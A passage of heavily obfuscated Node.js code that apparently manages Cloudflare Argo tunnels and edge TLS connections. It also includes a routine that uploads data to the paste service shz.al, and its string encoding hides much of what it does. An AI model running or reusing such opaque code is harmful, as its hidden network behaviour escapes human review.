    constructor(a, b, c) {
        const eF = a0aY, d = eF(0x57f)[eF(0x140)]('|');
        let f = 0x0;
        while (!![]) {
            switch (d[f++]) {
            case '0':
                this[eF(0x6ae)] = ![];
                continue;
            case '1':
                this[eF(0x2cd)] = Buffer['alloc'](0x0);
                continue;
            case '2':
                this[eF(0x23c)] = b;
                continue;
            case '3':
                this['log'] = c;
                continue;
            case '4':
                this[eF(0x23f)] = a;
                continue;
            }
            break;
        }
    }
    [a0aY(0x15f)](a, b, c, d) {
        const eG = a0aY, f = {
                'sTmAT': function (g, h) {
                    return g(h);
                }
            };
        this[eG(0x23f)][eG(0x319)](this[eG(0x23c)], f[eG(0x783)](a0ak, 0x0), ![]), this[eG(0x23f)]['sendData'](this[eG(0x23c)], a0al(0x1, 0x0, a, b, c, d), ![]);
    }
    ['feed'](a) {
        const eH = a0aY, b = {
                'xECAb': function (f, g) {
                    return f(g);
                },
                'awGAV': function (f, g) {
                    return f + g;
                },
                'VgiSo': eH(0xfb),
                'jRrcM': eH(0x90c),
                'SCvDr': function (f, g) {
                    return f + g;
                },
                'bhSqV': eH(0x612),
                'SQrXj': 'ignoring\x20control\x20RPC\x20message:\x20'
            };
        this['buffer'] = this['buffer'][eH(0x7a3)] ? Buffer[eH(0x322)]([
            this['buffer'],
            a
        ]) : a;
        let c, d;
        [c, d] = b[eH(0x6f5)](a0am, this[eH(0x2cd)]), this['buffer'] = d;
        for (const f of c) {
            try {
                const g = a0ap(f);
                g['ok'] ? (this['log']['info'](b[eH(0x874)](b[eH(0x674)], g[eH(0x5e2)] || b[eH(0x904)])), this[eH(0x23f)][eH(0x539)] = !![]) : (this[eH(0x10d)][eH(0x335)](b[eH(0x1e2)](eH(0x67c), g['error'] || b[eH(0x21b)])), this['connection'][eH(0x712)] = !![], this['connection'][eH(0x3a0)] = !![]);
            } catch (h) {
                this[eH(0x10d)][eH(0x925)](b[eH(0x1e2)](b[eH(0x82c)], h));
            }
        }
    }
}
function a0aA(a) {
    const eI = a0aY, b = {
            'meOIt': function (c, d) {
                return c(d);
            },
            'LhJjJ': function (c, d, f) {
                return c(d, f);
            },
            'IMDyw': 'origin\x20must\x20be\x20an\x20http://\x20or\x20https://\x20URL',
            'iJcaP': eI(0x3ad),
            'yGYRm': function (c, d) {
                return c(d);
            },
            'PYwuT': function (c, d) {
                return c === d;
            },
            'wUaoP': 'error'
        };
    return new Promise((c, d) => {
        const eJ = eI, f = {
                'kDlHA': eJ(0x8e9),
                'lIVsP': function (n, o) {
                    const eK = eJ;
                    return b[eK(0x580)](n, o);
                },
                'Csobx': function (n, o, p) {
                    const eL = eJ;
                    return b[eL(0x1d1)](n, o, p);
                },
                'SrhGO': function (n, o, p) {
                    const eM = eJ;
                    return b[eM(0x1d1)](n, o, p);
                },
                'ozKvz': 'secureConnect'
            };
        let g;
        try {
            g = new URL(a);
        } catch (n) {
            b[eJ(0x580)](d, new Error(b['IMDyw']));
            return;
        }
        if (![
                eJ(0x272),
                b['iJcaP']
            ][eJ(0x4f6)](g['protocol']) || !g[eJ(0x4c1)]) {
            b['yGYRm'](d, new Error(b[eJ(0x819)]));
            return;
        }
        const h = b[eJ(0x24b)](g['protocol'], b[eJ(0x619)]), i = g['port'] || (h ? 0x1bb : 0x50), j = a0i[eJ(0x2d9)]({
                'host': g[eJ(0x4c1)],
                'port': i
            });
        let k = ![];
        const l = (o, p) => {
                const eN = eJ;
                if (k)
                    return;
                k = !![], j['removeListener'](f[eN(0x6ec)], m), j['setTimeout'](0x0), f[eN(0x4b5)](o, p);
            }, m = o => {
                const eO = eJ;
                !k && f[eO(0x56f)](l, d, o);
            };
        j['on'](b[eJ(0x235)], m), j[eJ(0x797)](0x7530, () => j['destroy'](new Error('origin\x20connection\x20timeout'))), j['on'](eJ(0x2d9), () => {
            const eP = eJ;
            if (!h) {
                f[eP(0x56f)](l, c, j);
                return;
            }
            const o = a0j['connect']({
                'socket': j,
                'servername': g[eP(0x4c1)]
            });
            o['on'](f[eP(0x6ec)], p => {
                const eQ = eP;
                !k && f[eQ(0x49b)](l, d, p);
            }), o['on'](f[eP(0x1b6)], () => {
                l(c, o);
            });
        });
    });
}
function a0aB(a) {
    const eR = a0aY, b = {
            'nxfnS': function (d, f) {
                return d < f;
            },
            'EEzaT': function (d, f) {
                return d + f;
            }
        }, c = [];
    for (let d = 0x0; b[eR(0x204)](d, a[eR(0x81e)]['length']); d += 0x2) {
        c['push']([
            a[eR(0x81e)][d],
            a[eR(0x81e)][b[eR(0x618)](d, 0x1)]
        ]);
    }
    return c;
}
function a0aC(a, b, c, d, f) {
    const eS = a0aY, g = {
            'VLJMA': function (h, i) {
                return h(i);
            },
            'lUUGJ': eS(0x418),
            'TfbZn': eS(0x272),
            'CjPqY': eS(0x3ad),
            'tfLNp': function (h, i) {
                return h === i;
            },
            'MWojk': eS(0x143),
            'RFxcm': function (h, i) {
                return h === i;
            },
            'dbrRv': 'connection',
            'aRDIG': function (h, i) {
                return h === i;
            },
            'AFkER': eS(0x207),
            'cyoIC': 'content-length',
            'qrhow': eS(0x2d3),
            'QBUFb': function (h, i) {
                return h(i);
            },
            'njgxu': eS(0x8e9)
        };
    return new Promise((h, i) => {
        const eT = eS;
        let j;
        try {
            j = new URL(a);
        } catch (q) {
            g[eT(0x483)](i, new Error(g[eT(0x6ea)]));
            return;
        }
        if (![
                g[eT(0x425)],
                g[eT(0x851)]
            ][eT(0x4f6)](j[eT(0x79b)]) || !j[eT(0x4c1)]) {
            g[eT(0x483)](i, new Error(g['lUUGJ']));
            return;
        }
        const k = g[eT(0x33d)](j[eT(0x79b)], g[eT(0x851)]), l = j['port'] || (k ? 0x1bb : 0x50), m = {};
        for (const [r, s] of d) {
            const t = r[eT(0x1a2)]();
            if (g[eT(0x33d)](t, g[eT(0x84d)]) || g[eT(0x5ca)](t, g[eT(0x5bb)]) || g[eT(0x1c0)](t, g[eT(0x40a)]) || g['aRDIG'](t, g['cyoIC']))
                continue;
            m[r] = s;
        }
        m['Host'] = j[eT(0x143)];
        f['length'] && (m[g[eT(0x239)]] = g['QBUFb'](String, f['length']));
        const n = c[eT(0x627)]('/') ? c : '/' + c, o = k ? a0h : a0g, p = o[eT(0x543)]({
                'hostname': j[eT(0x4c1)],
                'port': l,
                'path': n,
                'method': b,
                'headers': m,
                'timeout': 0x7530
            }, u => {
                const eU = eT;
                h({
                    'status': u[eU(0x7d8)],
                    'headers': a0aB(u),
                    'body': u
                });
            });
        p['on'](g[eT(0x196)], u => i(u)), p['end'](f['length'] ? f : undefined);
    });
}
function a0aD(a) {
    const eV = a0aY, b = {
            'iIPZV': eV(0x318),
            'ExxBz': eV(0x8e9),
            'tIQwp': eV(0x71e),
            'aWdIZ': eV(0x43c),
            'vxhRP': function (c, d) {
                return c < d;
            },
            'SeeZG': 'latin1',
            'uJnRz': function (c, d) {
                return c(d);
            },
            'MGsUu': eV(0x840),
            'rpxRC': function (c, d) {
                return c > d;
            },
            'yyTpb': function (c, d) {
                return c + d;
            },
            'bDGLm': function (c) {
                return c();
            },
            'hGgRn': function (c, d) {
                return c(d);
            }
        };
    return new Promise((c, d) => {
        const eW = eV, f = {
                'lqQqM': b[eW(0x84a)],
                'bcqaa': b[eW(0x1cd)],
                'gsLBj': b[eW(0x8ed)],
                'RolKY': b[eW(0x4c3)],
                'TyyBA': function (l, m) {
                    const eX = eW;
                    return b[eX(0x789)](l, m);
                },
                'gVltX': function (l) {
                    return l();
                },
                'lgNiR': b[eW(0x117)],
                'nmixS': function (l, m) {
                    return b['uJnRz'](l, m);
                },
                'NQwTM': b[eW(0x6e1)],
                'vvwEB': function (l, m) {
                    const eY = eW;
                    return b[eY(0x87a)](l, m);
                },
                'FSinL': function (l, m) {
                    return b['yyTpb'](l, m);
                },
                'bLnNk': function (l) {
                    return b['bDGLm'](l);
                },
                'xMTjV': function (l, m) {
                    const eZ = eW;
                    return b[eZ(0x45c)](l, m);
                },
                'YOaJQ': function (l, m) {
                    return b['hGgRn'](l, m);
                }
            };
        let g = Buffer['alloc'](0x0);
        const h = () => {
                const f0 = eW;
                a['removeListener'](f[f0(0x462)], i), a['removeListener'](f[f0(0x25d)], j), a['removeListener'](f[f0(0x31b)], k), a[f0(0x39b)](f0(0x92b), k);
            }, i = l => {
                const f1 = eW;
                g = g[f1(0x7a3)] ? Buffer[f1(0x322)]([
                    g,
                    l
                ]) : l;
                const m = g['indexOf'](f[f1(0x364)]);
                if (f[f1(0x828)](m, 0x0))
                    return;
                f[f1(0x5d9)](h);
                const n = g['subarray'](0x0, m)[f1(0x491)](f[f1(0x80d)]), o = n[f1(0x140)]('\x0d\x0a'), p = o[0x0][f1(0x140)]('\x20'), q = parseInt(p[0x1], 0xa);
                if (!Number['isInteger'](q)) {
                    f[f1(0x17e)](d, new Error(f[f1(0x2e7)]));
                    return;
                }
                const r = [];
                for (let s = 0x1; f[f1(0x828)](s, o['length']); s++) {
                    const t = o[s];
                    if (!t)
                        continue;
                    const u = t[f1(0x5b4)](':');
                    f[f1(0x232)](u, 0x0) && r['push']([
                        t[f1(0x489)](0x0, u)[f1(0x63e)](),
                        t[f1(0x489)](u + 0x1)[f1(0x63e)]()
                    ]);
                }
                f[f1(0x17e)](c, {
                    'status': q,
                    'headers': r,
                    'rest': g['subarray'](f[f1(0x746)](m, 0x4))
                });
            }, j = l => {
                const f2 = eW;
                f[f2(0x252)](h), f[f2(0x2a1)](d, l);
            }, k = () => {
                const f3 = eW;
                h(), f[f3(0x259)](d, new Error(f3(0x52a)));
            };
        a['on'](b[eW(0x84a)], i), a['on'](b['ExxBz'], j), a['on'](b[eW(0x8ed)], k), a['on'](eW(0x92b), k);
    });
}
function a0aE(a) {
    const f4 = a0aY, b = {
            'bcvMU': 'dns:',
            'xajqc': function (f, g) {
                return f === g;
            },
            'kNOwL': f4(0x36e),
            'ABfSa': function (f, g) {
                return f === g;
            },
            'jVvOL': 'cftunnel.com',
            'jVKtH': 'no\x20peer\x20certificate',
            'FPxgh': 'CloudFlare,\x20Inc.',
            'GXcEB': f4(0x554),
            'mltmY': function (f, g) {
                return f(g);
            },
            'ylAvG': f4(0x4d9),
            'Sdzep': function (f, g) {
                return f + g;
            },
            'QiySL': f4(0x64c),
            'KTsdv': function (f, g) {
                return f !== g;
            },
            'fWBbE': f4(0x926)
        };
    if (!a || !a[f4(0x6a1)])
        return b[f4(0x5bd)];
    if (a[f4(0x6a1)]['O'] !== b[f4(0x74d)])
        return b[f4(0x32e)] + (a[f4(0x6a1)]['O'] || '');
    if (!b[f4(0x8c5)](String, a[f4(0x6a1)]['OU'] || '')[f4(0x627)](b['ylAvG']))
        return b['Sdzep'](b[f4(0x421)], a[f4(0x6a1)]['OU'] || '');
    if (!a[f4(0x5b2)] || b[f4(0x875)](a[f4(0x5b2)]['CN'], f4(0x5cf)))
        return b[f4(0x602)];
    const c = String(a['subjectaltname'] || '')[f4(0x140)](',')['map'](f => f[f4(0x63e)]()[f4(0x1a2)]()), d = c[f4(0x190)](f => {
            const f5 = f4;
            if (!f['startsWith'](b[f5(0x5a6)]))
                return ![];
            const g = f['slice'](0x4);
            return b[f5(0x6df)](g, b[f5(0x908)]) || b[f5(0x5b3)](g, b[f5(0x53d)]) || g[f5(0x627)]('*.') && b[f5(0x908)][f5(0x389)](g[f5(0x489)](0x1));
        });
    if (!d)
        return f4(0x163);
    return null;
}
function a0b(a, b) {
    a = a - 0xed;
    const c = a0a();
    let d = c[a];
    if (a0b['hvxYcV'] === undefined) {
        var e = function (h) {
            const i = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
            let j = '', l = '';
            for (let m = 0x0, n, o, p = 0x0; o = h['charAt'](p++); ~o && (n = m % 0x4 ? n * 0x40 + o : o, m++ % 0x4) ? j += String['fromCharCode'](0xff & n >> (-0x2 * m & 0x6)) : 0x0) {
                o = i['indexOf'](o);
            }
            for (let q = 0x0, r = j['length']; q < r; q++) {
                l += '%' + ('00' + j['charCodeAt'](q)['toString'](0x10))['slice'](-0x2);
            }
            return decodeURIComponent(l);
        };
        a0b['dfoHnu'] = e, a0b['VtmwLX'] = {}, a0b['hvxYcV'] = !![];
    }
    const f = c[0x0];
    a0b['ntWuCX'] !== f && (a0b['VtmwLX'] = {}, a0b['ntWuCX'] = f);
    const g = a0b['VtmwLX'][a];
    return g === undefined ? (d = a0b['dfoHnu'](d), a0b['VtmwLX'][a] = d) : d = g, d;
}
function a0aF(a, b) {
    const f6 = a0aY, c = {
            'FYmdG': function (h, i) {
                return h + i;
            },
            'ArDao': f6(0x119),
            'yIbPO': function (h, i) {
                return h !== i;
            },
            'gJKLV': f6(0x111),
            'AHVJS': function (h, i) {
                return h(i);
            },
            'DMGHb': f6(0x36e),
            'nFcad': f6(0x8e9),
            'wgyyV': 'secureConnect',
            'WjuMk': f6(0x837),
            'uthpD': f6(0x61a),
            'eAzdJ': function (h, i) {
                return h + i;
            },
            'YNRYR': f6(0x574)
        }, d = a0a2[f6(0x489)]()[f6(0x65b)](() => Math[f6(0x836)]() - 0.5);
    let f = null;
    const g = async () => {
        const fd = f6;
        for (const h of d) {
            try {
                return await new Promise((i, j) => {
                    const f8 = a0b, k = {
                            'AicOl': function (m, n) {
                                const f7 = a0b;
                                return c[f7(0x4db)](m, n);
                            },
                            'brRLb': c[f8(0x4b6)],
                            'RGpgG': function (m, n) {
                                const f9 = f8;
                                return c[f9(0x303)](m, n);
                            },
                            'zCiIn': c[f8(0x781)],
                            'dtSWv': function (m, n) {
                                const fa = f8;
                                return c[fa(0x4db)](m, n);
                            },
                            'msTbq': function (m, n) {
                                const fb = f8;
                                return c[fb(0x1ed)](m, n);
                            }
                        }, l = a0j[f8(0x2d9)]({
                            'host': h,
                            'port': a0a3,
                            'ALPNProtocols': ['h2'],
                            'servername': c['DMGHb'],
                            'rejectUnauthorized': ![]
                        });
                    l[f8(0x797)](0x2710, () => l[f8(0x1f0)](new Error(f8(0x220)))), l['on'](c[f8(0x6cb)], j), l['on'](c[f8(0x3f7)], () => {
                        const fc = f8;
                        if (a) {
                            const n = a0aE(l[fc(0x67f)](![]));
                            if (n) {
                                l[fc(0x1f0)](new Error(k[fc(0x58f)](k[fc(0x78c)], n)));
                                return;
                            }
                        }
                        const m = l[fc(0x676)];
                        if (m && k[fc(0x112)](m, 'h2')) {
                            l[fc(0x1f0)](new Error(k[fc(0x486)]));
                            return;
                        }
                        a0aK > 0x0 ? l[fc(0x797)](a0aK, () => l[fc(0x1f0)](new Error('edge\x20connection\x20idle\x20timeout'))) : l[fc(0x797)](0x0), b[fc(0x281)](k['AicOl'](k[fc(0x79c)](fc(0x44b) + h, ':'), a0a3)), k['msTbq'](i, l);
                    });
                });
            } catch (i) {
                f = i, b[fd(0x335)](c[fd(0x4db)](c['WjuMk'], h) + c[fd(0x145)] + i);
            }
        }
        throw new Error(c['eAzdJ'](c[fd(0x4af)], f));
    };
    return g();
}
const a0aG = 0x2;
function a0aH(a, b, c) {
    const d = {
            'dmivx': function (g, h, i) {
                return g(h, i);
            }
        }, f = d['dmivx'](parseInt, process.env[a] || '', 0xa);
    if (!Number['isInteger'](f) || f < c)
        return b;
    return f;
}
const a0aI = a0aH('KISAMA_ARGO_REREGISTER_AFTER', 0x5, 0x2), a0aJ = 0x1e, a0aK = ((() => {
        const fe = a0aY, a = {
                'SAAvv': function (c, d) {
                    return c < d;
                },
                'SxWUu': function (c, d) {
                    return c * d;
                },
                'IcjBc': function (c, d) {
                    return c === d;
                }
            }, b = parseInt(process.env.KISAMA_ARGO_IDLE_TIMEOUT || '', 0xa);
        if (!Number[fe(0x16d)](b) || a['SAAvv'](b, 0x0))
            return a[fe(0x241)](0x12c, 0x3e8);
        return a[fe(0x412)](b, 0x0) ? 0x0 : Math[fe(0x434)](b, 0xa) * 0x3e8;
    })());
function a0aL(a) {
    const ff = a0aY, b = {
            'jkOau': function (c, d) {
                return c === d;
            },
            'AvUNp': 'string',
            'NyhNg': function (c, d) {
                return c === d;
            }
        };
    if (b[ff(0x21c)](typeof a, b['AvUNp'])) {
        const c = a[ff(0x63e)]();
        if (c)
            try {
                return JSON[ff(0x7f4)](c);
            } catch (d) {
            }
        return {};
    }
    return a && b[ff(0x224)](typeof a, ff(0x139)) ? a : {};
}
class a0aM {
    constructor(a) {
        const fg = a0aY;
        this[fg(0x10d)] = a, this[fg(0x348)] = new Map(), this[fg(0x28d)] = null;
    }
    async [a0aY(0x702)](a, b) {
        const fh = a0aY, c = {
                'eayJr': function (l, m) {
                    return l > m;
                },
                'jtSTY': function (l, m) {
                    return l(m);
                },
                'cWVHd': fh(0x81c),
                'qhqiy': function (l, m) {
                    return l + m;
                },
                'sinhq': fh(0x5b1),
                'ontRv': fh(0x141),
                'SwNvH': function (l, m) {
                    return l + m;
                },
                'cVUKc': function (l, m) {
                    return l + m;
                },
                'MxOtv': function (l, m) {
                    return l + m;
                },
                'TjZXA': fh(0x435)
            }, d = this[fh(0x348)][fh(0x1f2)](a) || [];
        if (c[fh(0x8bf)](d[fh(0x7a3)], 0x0) && !b) {
            const l = new Error(fh(0x2fd) + a + fh(0x843));
            l[fh(0x59c)] = 0x199, l[fh(0x56b)] = a;
            throw l;
        }
        let f, g, h, i;
        try {
            [f, g, h, i] = await c[fh(0x5a8)](a0au, c[fh(0x35f)]);
        } catch (m) {
            const n = new Error(c[fh(0x8aa)](c[fh(0x7c0)], m[fh(0x49d)]));
            n['status'] = 0x1f4, n[fh(0x56b)] = a;
            throw n;
        }
        const j = f[fh(0x627)](c[fh(0xf0)]) ? f : c[fh(0x775)](c['ontRv'], f), k = {
                'tunnelDomain': j,
                'port': a,
                'createdAt': new Date()['toISOString']()[fh(0x655)](/\.\d{3}Z$/, 'Z'),
                'stopped': ![],
                'sock': null,
                'runPromise': null
            };
        return k[fh(0x679)] = this[fh(0x4a2)](k, g, h, i)['catch'](o => this[fh(0x10d)]['warning']('argo\x20tunnel\x20loop\x20for\x20' + j + fh(0x2a4) + o[fh(0x49d)])), d[fh(0x75e)](k), this['tunnels'][fh(0x50d)](a, d), this['log'][fh(0x281)](c[fh(0x773)](c['MxOtv']('argo\x20tunnel\x20created:\x20' + j, c[fh(0x5ed)]), a)), k;
    }
    [a0aY(0x7b0)]() {
        const fi = a0aY, a = [], b = [...this[fi(0x348)][fi(0x84b)]()]['sort']((c, d) => c - d);
        for (const c of b) {
            for (const d of this['tunnels'][fi(0x1f2)](c)) {
                a[fi(0x75e)]({
                    'tunnel_domain': d['tunnelDomain'],
                    'port': d['port'],
                    'created_at': d[fi(0x632)]
                });
            }
        }
        return a;
    }
    async [a0aY(0x15c)](a, b) {
        const fj = a0aY, c = {
                'xESFP': function (i, j) {
                    return i === j;
                },
                'zzsUA': function (i, j) {
                    return i === j;
                },
                'dqYKV': function (i, j) {
                    return i === j;
                },
                'yDgSW': function (i, j) {
                    return i > j;
                },
                'mMmUr': function (i, j) {
                    return i === j;
                },
                'ziFSI': function (i, j) {
                    return i !== j;
                },
                'omTpI': function (i, j) {
                    return i + j;
                },
                'HxdQz': fj(0x2f1)
            }, d = this[fj(0x348)][fj(0x1f2)](a) || [];
        if (c[fj(0x5c4)](d[fj(0x7a3)], 0x0))
            return {
                'status': 0x194,
                'message': fj(0x778) + a
            };
        let f;
        if (c[fj(0x922)](b, undefined) || c[fj(0x2d6)](b, null) || c[fj(0x5c4)](b, '')) {
            if (c['yDgSW'](d['length'], 0x1))
                return {
                    'status': 0x199,
                    'message': fj(0x863) + a + ',\x20specify\x20tunnel_domain\x20to\x20disambiguate'
                };
            f = d;
        } else {
            f = d[fj(0x896)](i => i[fj(0x33e)] === b);
            if (c[fj(0x513)](f[fj(0x7a3)], 0x0))
                return {
                    'status': 0x194,
                    'message': fj(0x778) + a + fj(0x85d) + b
                };
        }
        const g = [];
        for (const i of f) {
            i['stopped'] = !![];
            if (c[fj(0x2a7)](i[fj(0x12e)], null))
                try {
                    i[fj(0x12e)][fj(0x1f0)]();
                } catch (j) {
                }
            await i['runPromise'][fj(0x7ea)](() => {
            }), g[fj(0x75e)]({
                'tunnel_domain': i['tunnelDomain'],
                'port': i[fj(0x56b)],
                'created_at': i['createdAt']
            });
        }
        const h = d[fj(0x896)](k => !k['stopped']);
        c[fj(0x36b)](h['length'], 0x0) ? this[fj(0x348)][fj(0x50d)](a, h) : this[fj(0x348)][fj(0x59d)](a);
        for (const k of g) {
            this['log'][fj(0x281)](c['omTpI'](c['HxdQz'], k['tunnel_domain']));
        }
        return {
            'status': 'ok',
            'deleted': g['length'],
            'tunnels': g
        };
    }
    async [a0aY(0x4a2)](a, b, c, d) {
        const fk = a0aY, f = {
                'DuEjl': function (k, l) {
                    return k < l;
                },
                'njAvO': function (k, l) {
                    return k + l;
                },
                'Uouac': fk(0x6fe),
                'TYfUl': function (k, l) {
                    return k !== l;
                },
                'Cvifx': fk(0x8b6),
                'LXUKS': function (k, l) {
                    return k % l;
                },
                'lgwTC': function (k, l) {
                    return k !== l;
                },
                'pqJyZ': function (k, l) {
                    return k !== l;
                },
                'oFAGE': function (k, l) {
                    return k >= l;
                },
                'oSWqf': function (k, l) {
                    return k(l);
                },
                'ymUEq': function (k, l) {
                    return k(l);
                }
            }, g = f[fk(0x25f)](f['Uouac'], a[fk(0x56b)]), h = async k => {
                const fl = fk;
                for (let l = 0x0; f['DuEjl'](l, k) && !a[fl(0x3a0)]; l += 0x1f4) {
                    await new Promise(m => setTimeout(m, Math[fl(0x5df)](0x1f4, k - l)));
                }
            };
        let i = 0x0, j = 0x0;
        while (!a[fk(0x3a0)]) {
            let k = null, l = null;
            try {
                const m = f[fk(0x511)](String(process.env.KISAMA_EDGE_INSECURE || '')[fk(0x1a2)](), f['Cvifx']);
                k = await a0aF(m, this[fk(0x10d)]);
                if (a[fk(0x3a0)]) {
                    try {
                        k['destroy']();
                    } catch (n) {
                    }
                    break;
                }
                a['sock'] = k, j = f[fk(0x826)](j + 0x1, 0x4), l = new a0ax(k, g, b, c, d, j, this[fk(0x10d)], a['tunnelDomain'], ![], { 'printed': !![] }), await l[fk(0x796)]();
            } catch (o) {
                !a[fk(0x3a0)] && this['log']['warning'](f['njAvO'](fk(0x8d3) + a['tunnelDomain'], fk(0x684)) + o[fk(0x49d)]);
            } finally {
                if (f['lgwTC'](k, null))
                    try {
                        k[fk(0x1f0)]();
                    } catch (p) {
                    }
                a['sock'] = null;
            }
            if (a['stopped'])
                break;
            f[fk(0x4e5)](l, null) && l[fk(0x539)] ? i = 0x0 : (i += 0x1, f[fk(0x8cf)](i, a0aI) && (await this[fk(0x6f2)](a, (q, r, s) => {
                b = q, c = r, d = s;
            }) ? i = 0x0 : await f['oSWqf'](h, a0aJ * 0x3e8))), !a[fk(0x3a0)] && await f[fk(0x1bf)](h, a0aG * 0x3e8);
        }
    }
    [a0aY(0x6f2)](a, b) {
        const fm = a0aY, c = {
                'YZbXY': fm(0x141),
                'WQeaz': function (f, g) {
                    return f + g;
                },
                'ggcaa': function (f, g) {
                    return f + g;
                },
                'mrYqU': function (f, g) {
                    return f + g;
                },
                'UwHSl': 'argo\x20tunnel\x20domain\x20changed:\x20',
                'IGoET': function (f, g) {
                    return f === g;
                },
                'LXdif': 'function',
                'IUoph': function (f, g) {
                    return f + g;
                },
                'WzRQB': fm(0x282),
                'dMppP': fm(0x81c)
            }, d = this[fm(0x41d)] || a0au;
        return d(c[fm(0x5eb)])['then'](([f, g, h, i]) => {
            const fn = fm, j = a['tunnelDomain'];
            b(g, h, i), a[fn(0x33e)] = f[fn(0x627)](c[fn(0x214)]) ? f : c[fn(0x868)](c[fn(0x214)], f), this[fn(0x10d)][fn(0x335)](c[fn(0x347)](c[fn(0x4cd)](c[fn(0x2bf)], j), fn(0x438)) + a[fn(0x33e)]);
            if (c[fn(0x120)](typeof this[fn(0x28d)], c['LXdif']))
                try {
                    this[fn(0x28d)](j, a[fn(0x33e)]);
                } catch (k) {
                }
            return !![];
        })[fm(0x7ea)](f => {
            const fo = fm;
            return this[fo(0x10d)][fo(0x335)](c[fo(0x640)](c[fo(0x8eb)], f[fo(0x49d)])), ![];
        });
    }
}
class a0aN {
    static [a0aY(0x218)] = ![];
    static [a0aY(0x8b4)] = null;
    static [a0aY(0x5b0)] = /^[A-Za-z0-9+_\-*$=@,;[/\]]+$/;
    static ['_SHZAL_KEY_HINT_SHOWN'] = ![];
    static [a0aY(0x8e8)]() {
        const fp = a0aY, a = {
                'VgYOx': function (g, h) {
                    return g < h;
                },
                'ZUPjV': function (g, h) {
                    return g < h;
                },
                'STSTi': fp(0x600),
                'YiKgl': function (g, h) {
                    return g === h;
                }
            }, b = a0P[fp(0x600)] || '', c = a0P[fp(0x8ae)] || a0P['KNAME'] || '', d = [];
        if (a['VgYOx'](b[fp(0x7a3)], 0x3))
            d[fp(0x75e)](fp(0x35c) + b[fp(0x7a3)] + fp(0x366));
        if (!this['_SHZAL_NAME_CHARS'][fp(0x731)](b))
            d[fp(0x75e)](fp(0x2a6));
        if (a['ZUPjV'](c[fp(0x7a3)], 0x8))
            d['push']('密钥过短\x20(' + c['length'] + fp(0x806) + (a0P[fp(0x8ae)] ? 'KNAME_KEY' : a[fp(0x47c)]) + ')');
        const f = a[fp(0x73a)](d[fp(0x7a3)], 0x0);
        return !f && !this['_SHZAL_KEY_HINT_SHOWN'] && (this['_SHZAL_KEY_HINT_SHOWN'] = !![], a0D[fp(0x281)](fp(0x1b4) + d[fp(0x52c)](';\x20') + fp(0x21a) + (b || '(未设置)') + fp(0x159) + (a0P['KNAME_KEY'] || fp(0x32d)) + ')'), a0D[fp(0x281)](fp(0x568))), f;
    }
    static [a0aY(0x2c8)]() {
        const fq = a0aY, a = {
                'WyVZb': function (b, c) {
                    return b === c;
                },
                'hFAlK': function (b, c) {
                    return b(c);
                },
                'TYhqK': fq(0x8b6)
            };
        return a0P[fq(0x17a)] || a[fq(0x6f3)](a[fq(0x61b)](String, process.env.SHZAL_DEBUG || '')[fq(0x1a2)](), a[fq(0x23b)]);
    }
    static ['reportShzal'](a) {
        const fr = a0aY, b = {
                'GWzvL': function (f, g) {
                    return f + g;
                },
                'cbJYS': fr(0x3ae),
                'KyZbU': 'end',
                'mCiUR': fr(0x6d0),
                'PjrDs': fr(0x8e9),
                'shovj': '\x20(失败)',
                'TNbwf': function (f, g) {
                    return f(g);
                },
                'FkhvE': 'POST\x20https://shz.al/\x20状态:\x20',
                'qnmjb': function (f, g) {
                    return f === g;
                },
                'qRVTG': fr(0x4fa),
                'VEXpX': function (f, g, h, i, j) {
                    return f(g, h, i, j);
                },
                'jarzt': function (f, g) {
                    return f(g);
                },
                'whiBg': fr(0x1af),
                'PxNby': '上报成功',
                'RsmwR': function (f, g) {
                    return f + g;
                },
                'vjHkl': fr(0x503),
                'WZOvd': 'hex',
                'VzbFX': fr(0x3c0),
                'oyQpL': fr(0x131),
                'AClsQ': function (f, g) {
                    return f > g;
                },
                'OxhUb': 'https://shz.al/',
                'iaYxV': function (f, g) {
                    return f + g;
                },
                'IHsOW': fr(0x15e)
            }, c = this['reportShzalDebug'](), d = f => {
                const ft = fr;
                if (c)
                    a0D[ft(0x925)](b[ft(0x512)](b[ft(0x296)], f));
            };
        return new Promise(f => {
            const fu = fr, g = {
                    'FeUtL': b[fu(0x60b)],
                    'xFmfB': function (n, o) {
                        return n(o);
                    },
                    'mTEQL': function (n, o) {
                        return n + o;
                    },
                    'dcjxN': function (n, o) {
                        const fv = fu;
                        return b[fv(0x512)](n, o);
                    },
                    'OxRSp': '\x20请求异常:\x20',
                    'QPjJr': b[fu(0x210)],
                    'zsvdb': b[fu(0x2d5)],
                    'LHitA': fu(0x1d8),
                    'ROmNl': function (n, o) {
                        return n === o;
                    },
                    'BmVtI': b[fu(0x268)],
                    'YLkLt': function (n, o) {
                        return b['TNbwf'](n, o);
                    },
                    'SSkRd': b[fu(0x507)],
                    'mVvSp': function (n, o) {
                        return b['qnmjb'](n, o);
                    },
                    'UloVx': function (n, o) {
                        const fw = fu;
                        return b[fw(0x7c7)](n, o);
                    },
                    'rBjdV': b[fu(0x8a3)],
                    'Bbafg': function (n, o, p, q, r) {
                        const fx = fu;
                        return b[fx(0x1d4)](n, o, p, q, r);
                    },
                    'jIHST': function (n, o) {
                        const fy = fu;
                        return b[fy(0x7c4)](n, o);
                    },
                    'pFuIx': b[fu(0x2b0)],
                    'JfRlW': b[fu(0x4e1)],
                    'yRwMX': function (n, o) {
                        const fz = fu;
                        return b[fz(0x512)](n, o);
                    }
                }, h = a0P[fu(0x600)], i = a0P[fu(0x8ae)] || a0P[fu(0x600)], j = b[fu(0x644)](b[fu(0x382)], a0k[fu(0x3f6)](0xc)[fu(0x491)](b[fu(0x4ff)])), k = [
                    [
                        'c',
                        a
                    ],
                    [
                        'n',
                        h
                    ],
                    [
                        's',
                        i
                    ],
                    [
                        'e',
                        '7d'
                    ]
                ], l = n => {
                    const fA = fu, o = n[fA(0x575)](([p, q]) => Buffer[fA(0x68c)]('--' + j + fA(0x209) + p + fA(0x1ef) + q + '\x0d\x0a'));
                    return o[fA(0x75e)](Buffer['from']('--' + j + fA(0x530))), Buffer[fA(0x322)](o);
                }, m = (n, o, p, q) => {
                    const fB = fu, r = new URL(n), s = a0h[fB(0x543)]({
                            'hostname': r[fB(0x4c1)],
                            'port': r[fB(0x56b)] || 0x1bb,
                            'path': r[fB(0x31f)] + r[fB(0x3ee)],
                            'method': p,
                            'headers': {
                                'Content-Type': fB(0x265) + j,
                                'Content-Length': o ? o[fB(0x7a3)] : 0x0,
                                'User-Agent': g[fB(0x345)]
                            }
                        }, t => {
                            const fC = fB;
